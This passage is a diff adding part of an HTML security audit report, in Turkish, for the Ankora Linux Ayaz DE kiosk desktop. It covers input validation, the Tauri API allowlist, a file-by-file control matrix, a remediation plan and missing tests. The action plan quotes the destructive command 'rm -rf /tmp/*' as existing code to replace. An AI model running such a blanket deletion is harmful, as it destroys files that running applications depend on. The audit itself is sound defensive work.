+        <h3>Güvenli Kurulum Motoru — Input Validation ve STDIN Pipe</h3>
+        <span class="severity-badge sev-positive">Güçlü</span>
+      </div>
+      <ul>
+        <li>Disk hedefi regex doğrulaması: Sadece <code>/dev/sd[a-z]+</code>, <code>/dev/vd[a-z]+</code>, <code>/dev/nvme&lt;N&gt;n&lt;N&gt;</code> kabul ediliyor</li>
+        <li>Bölüm (partition) seçimi engelli — yalnızca tam disk seçilebilir</li>
+        <li>Kullanıcı adı/hostname RFC uyumlu doğrulama</li>
+        <li>Parola <code>chpasswd</code>'ye STDIN pipe ile iletiliyor — komut satırı argümanında görünmüyor</li>
+        <li>Null byte ve newline enjeksiyonu engelleniyor</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>Derlemede Güvenlik Optimizasyonları</h3>
+        <span class="severity-badge sev-positive">Güçlü</span>
+      </div>
+      <ul>
+        <li><code>opt-level = "s"</code> → ikili boyut optimizasyonu</li>
+        <li><code>lto = true</code> → bağlayıcı optimizasyonu (dead code elimination)</li>
+        <li><code>panic = "abort"</code> → unwinding yerine abort (stack bilgi sızıntısı azaltma)</li>
+        <li><code>strip = true</code> → hata ayıklama sembollerinin kaldırılması</li>
+        <li><code>codegen-units = 1</code> → tekil derleme birimi (daha iyi optimizasyon)</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- ============================= BÖLÜM 5: TAURI KONFİGÜRASYON DENETİMİ ============================= -->
+  <div class="section page-break">
+    <h2 class="section-heading"><span class="icon" style="background:var(--blue-bg);color:var(--accent);">⚙</span> Tauri API Yüzey Alanı Denetimi</h2>
+    <p class="section-desc">Tauri allowlist ve pencere yapılandırması güvenlik değerlendirmesi</p>
+
+    <div class="card">
+      <table class="matrix-table">
+        <thead>
+          <tr><th>API Yüzeyi</th><th>Durum</th><th>Risk Notu</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>allowlist.all</code></td><td class="green">❌ Kapalı</td><td>Doğru — tüm API'ler varsayılan kapalı</td></tr>
+          <tr><td><code>window.all</code></td><td class="green">❌ Kapalı</td><td>Yalnızca gerekli pencere işlemleri açık</td></tr>
+          <tr><td><code>shell.all</code></td><td class="green">❌ Kapalı</td><td>Yalnızca shell.open (URL açma) izinli</td></tr>
+          <tr><td><code>shell.open</code></td><td class="yellow">✅ Açık</td><td>Harici URL/dosya açabilir — riski düşük</td></tr>
+          <tr><td><code>fs</code></td><td class="green">❌ Kapalı</td><td>Dosya sistemi API'si tamamen kapalı</td></tr>
+          <tr><td><code>dialog</code></td><td class="green">❌ Kapalı</td><td>Dialog API kapalı</td></tr>
+          <tr><td><code>http</code></td><td class="green">❌ Kapalı</td><td>Frontend HTTP istemcisi kapalı — tüm ağ çağrıları Rust tarafında</td></tr>
+          <tr><td><code>process</code></td><td class="green">❌ Kapalı</td><td>Süreç yönetimi API'si kapalı</td></tr>
+          <tr><td><code>clipboard</code></td><td class="green">❌ Kapalı</td><td>Pano erişimi kapalı</td></tr>
+          <tr><td><code>global-shortcut</code></td><td class="green">❌ Kapalı</td><td>Genel kısayol API'si kapalı</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ============================= BÖLÜM 6: DOSYA BAZLI GÜVENLİK MATRİSİ ============================= -->
+  <div class="section">
+    <h2 class="section-heading"><span class="icon" style="background:var(--blue-bg);color:var(--accent);">📋</span> Dosya Bazlı Güvenlik Kontrol Matrisi</h2>
+
+    <div class="card">
+      <table class="matrix-table">
+        <thead>
+          <tr><th>Dosya</th><th>Satır</th><th>Kontrol</th><th>Sonuç</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>main.rs</code></td><td>1,822</td><td>Komut enjeksiyonu</td><td class="green">✅ Whitelist + Blacklist + Metakarakter filtreleme</td></tr>
+          <tr><td><code>main.rs</code></td><td>—</td><td>Dosya yolu geçişi</td><td class="green">✅ canonicalize + .. kontrolü + nlink kontrolü</td></tr>
+          <tr><td><code>main.rs</code></td><td>—</td><td>SSRF koruması</td><td class="green">✅ Metadata IP blok + HTTPS zorlaması + redirect kapalı</td></tr>
+          <tr><td><code>main.rs</code></td><td>—</td><td>Input doğrulama</td><td class="green">✅ username/hostname/disk/package regex doğrulama</td></tr>
+          <tr><td><code>main.rs</code></td><td>—</td><td>Parola güvenliği</td><td class="yellow">⚠ STDIN pipe ama karmaşıklık kontrolü yok</td></tr>
+          <tr><td><code>main.rs</code></td><td>—</td><td>Kimlik depolama</td><td class="orange">⚠ Base64 — şifreleme değil</td></tr>
+          <tr><td><code>app.js</code></td><td>2,449</td><td>XSS koruması</td><td class="green">✅ escapeHtml() tutarlı kullanım</td></tr>
+          <tr><td><code>app.js</code></td><td>—</td><td>eval() kullanımı</td><td class="green">✅ Yok — güvenli</td></tr>
+          <tr><td><code>app.js</code></td><td>—</td><td>Hassas veri localStorage</td><td class="yellow">⚠ API key temizlenmiş, ama geçmiş saklanıyor</td></tr>
+          <tr><td><code>tauri.conf.json</code></td><td>67</td><td>CSP politikası</td><td class="yellow">⚠ unsafe-inline style</td></tr>
+          <tr><td><code>tauri.conf.json</code></td><td>—</td><td>API yüzey alanı</td><td class="green">✅ Minimal — sadece window + shell.open</td></tr>
+          <tr><td><code>Cargo.toml</code></td><td>30</td><td>Bağımlılık güvenliği</td><td class="green">✅ Güvenilir crate'ler, strip/LTO aktif</td></tr>
+          <tr><td><code>index.html</code></td><td>1,574</td><td>Inline script</td><td class="green">✅ Tüm JS harici dosyada</td></tr>
+          <tr><td><code>update-helper.sh</code></td><td>41</td><td>Script güvenliği</td><td class="green">✅ set -e, regex path doğrulama</td></tr>
+          <tr><td><code>ankora-updater-sudoers</code></td><td>5</td><td>Yetki yükseltme</td><td class="yellow">⚠ Sabit kullanıcı adı</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ============================= BÖLÜM 7: ÖNCELİKLİ AKSİYON PLANI ============================= -->
+  <div class="section page-break">
+    <h2 class="section-heading"><span class="icon" style="background:var(--accent-glow);color:var(--accent);">🎯</span> Öncelikli Aksiyon Planı</h2>
+    <p class="section-desc">Bulguların kapatılması için önerilen eylem sıralaması</p>
+
+    <div class="card">
+      <table class="matrix-table">
+        <thead>
+          <tr><th>#</th><th>Aksiyon</th><th>Ciddiyet</th><th>Çaba</th><th>Etki</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>1</td><td>Kimlik bilgisi depolamasını OS keyring veya AES-256 ile değiştir</td><td class="orange">Yüksek</td><td>Orta</td><td>API anahtarı ifşasını önler</td></tr>
+          <tr><td>2</td><td>Varsayılan "ankora" parolasını kaldır, karmaşıklık kuralı ekle</td><td class="orange">Yüksek</td><td>Düşük</td><td>Brute-force riskini ortadan kaldırır</td></tr>
+          <tr><td>3</td><td>Güncelleme paketine SHA256 checksum doğrulaması ekle</td><td class="yellow">Orta</td><td>Düşük</td><td>Paket bütünlüğünü garanti eder</td></tr>
+          <tr><td>4</td><td>Gemini API anahtarını URL yerine header'da ilet</td><td class="yellow">Orta</td><td>Düşük</td><td>Anahtar sızıntı riskini azaltır</td></tr>
+          <tr><td>5</td><td>CSP'den <code>unsafe-inline</code> kaldır</td><td class="yellow">Orta</td><td>Orta</td><td>CSS enjeksiyon vektörünü kapatır</td></tr>
+          <tr><td>6</td><td><code>rm -rf /tmp/*</code> yerine yaşlandırılmış temizlik kullan</td><td class="yellow">Orta</td><td>Düşük</td><td>Çalışan uygulama dosyalarını korur</td></tr>
+          <tr><td>7</td><td>Güncelleme notları render'ını <code>textContent</code> ile değiştir</td><td class="yellow">Orta</td><td>Düşük</td><td>DOM enjeksiyon yüzeyini kapatır</td></tr>
+          <tr><td>8</td><td>Tokio feature flag'ini <code>["rt", "macros"]</code> ile sınırla</td><td class="green">Düşük</td><td>Düşük</td><td>Saldırı yüzey alanını azaltır</td></tr>
+          <tr><td>9</td><td>Sudoers kuralını dinamik kullanıcıya bağla</td><td class="green">Düşük</td><td>Düşük</td><td>Farklı kurulumlarla uyumluluk sağlar</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ============================= BÖLÜM 8: BİRİM TESTLERİ ============================= -->
+  <div class="section">
+    <h2 class="section-heading"><span class="icon" style="background:var(--green-bg);color:var(--green);">🧪</span> Birim Test Kapsamı Değerlendirmesi</h2>
+
+    <div class="card">
+      <p>Projede 4 birim testi mevcut (main.rs satır 1747–1821). Testlerin kapsamı:</p>
+      <div style="margin-top: 12px;">
+        <div class="checklist-item"><span class="check-icon check-pass">✓</span> <span><code>is_valid_disk_target()</code> — Geçerli ve geçersiz disk yolları test ediliyor (13 assertion)</span></div>
+        <div class="checklist-item"><span class="check-icon check-pass">✓</span> <span><code>is_valid_username()</code> — Geçerli ve geçersiz kullanıcı adları test ediliyor (7 assertion)</span></div>
+        <div class="checklist-item"><span class="check-icon check-pass">✓</span> <span><code>is_valid_deb_package_name()</code> — Paket adı doğrulaması test ediliyor (7 assertion)</span></div>
+        <div class="checklist-item"><span class="check-icon check-pass">✓</span> <span><code>parse_semver()</code> / <code>is_newer_version()</code> — Versiyon karşılaştırma (9 assertion)</span></div>
+        <div class="checklist-item"><span class="check-icon check-warn">⚠</span> <span>Eksik: <code>run_terminal_command()</code> whitelist/blacklist testleri</span></div>
+        <div class="checklist-item"><span class="check-icon check-warn">⚠</span> <span>Eksik: <code>read_document_file()</code> path traversal testleri</span></div>
+        <div class="checklist-item"><span class="check-icon check-warn">⚠</span> <span>Eksik: <code>launch_application()</code> symlink bypass testleri</span></div>
+        <div class="checklist-item"><span class="check-icon check-warn">⚠</span> <span>Eksik: SSRF koruma testleri (metadata IP, redirect)</span></div>
+      </div>
+      <div class="recommendation-box">
+        <strong>Öneri</strong>
+        <p>Güvenlik kritik fonksiyonlar (komut yürütme, dosya okuma, uygulama başlatma, AI SSRF koruması) için birim testleri eklenmeli. Fuzz testing (cargo-fuzz) ile sınır durumları keşfedilmeli.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================= SONUÇ ============================= -->
+  <div class="section page-break">
+    <h2 class="section-heading"><span class="icon" style="background:var(--green-bg);color:var(--green);">📊</span> Sonuç ve Genel Değerlendirme</h2>
+
+    <div class="card" style="border-left: 3px solid var(--green);">
+      <p style="font-size: 14px; color: var(--text-primary); line-height: 1.8;">
+        Ankora Linux Ayaz DE v2.0.0 kod tabanı, bir kiosk masaüstü ortamı için <strong>ortalamanın üzerinde güvenlik önlemleri</strong> barındırmaktadır. Özellikle komut yürütme motoru, dosya erişim katmanı ve AI ajan güvenlik zinciri endüstri standartlarına uygun tasarlanmış ve katmanlı savunma (defense-in-depth) ilkesi doğru uygulanmıştır.
+      </p>
+      <p style="font-size: 14px; color: var(--text-primary); line-height: 1.8; margin-top: 12px;">
+        <strong>Kritik seviyede güvenlik açığı tespit edilmemiştir.</strong> Raporda belirtilen 2 yüksek ve 5 orta seviye bulgu, yukarıdaki aksiyon planı izlenerek kapatılabilir. Tüm öneriler uygulandığında güvenlik puanının <strong>90+</strong> seviyesine ulaşması beklenmektedir.
+      </p>
+      <p style="font-size: 14px; color: var(--text-primary); line-height: 1.8; margin-top: 12px;">
+        Projenin en güçlü yanları: <strong>minimal Tauri API yüzeyi</strong>, <strong>XSS korumasında tutarlılık</strong>, <strong>SSRF önlemlerinin kapsamlılığı</strong> ve <strong>derleme zamanı güvenlik optimizasyonlarıdır.</strong>
+      </p>
+    </div>
+  </div>
+
+  <!-- ============================= FOOTER ============================= -->
+  <footer class="report-footer">
+    <p>Ankora Linux Ayaz DE v2.0.0 — Güvenlik Denetim Raporu</p>
+    <p>Oluşturulma Tarihi: 24 Eylül 2026 • Denetçi: Antigravity Security Audit Engine</p>
+    <p style="margin-top: 8px;">Bu rapor yalnızca kod tabanı statik analizine dayanmaktadır. Dinamik penetrasyon testi ve çalışma zamanı analizi dahil değildir.</p>
+  </footer>
+
+</div>
+
+</body>
+</html>
